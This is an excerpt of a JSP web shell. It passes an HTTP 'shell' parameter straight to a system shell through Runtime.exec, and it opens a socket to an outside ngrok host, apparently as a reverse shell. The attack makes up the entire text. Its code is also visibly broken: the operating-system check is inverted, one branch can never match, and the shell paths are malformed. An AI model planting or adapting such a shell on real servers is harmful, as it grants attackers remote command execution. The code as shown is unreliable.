...
<%
    ...
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("usr/bin/sh");
        } else {
            shellPath = new String("usr/bin/bash");
        }
    } catch( Exception e ){}
    ...
    if (request.getParameter("shell") != null) {
        ...
        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("usr/bin/sh -c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("usr/bin/bash -c " + request.getParameter("shell"));
    ...
    try {
        Socket socket = new Socket( "0.tcp.ap.ngrok.io", 13914 ); // Replace with wanted ip and port
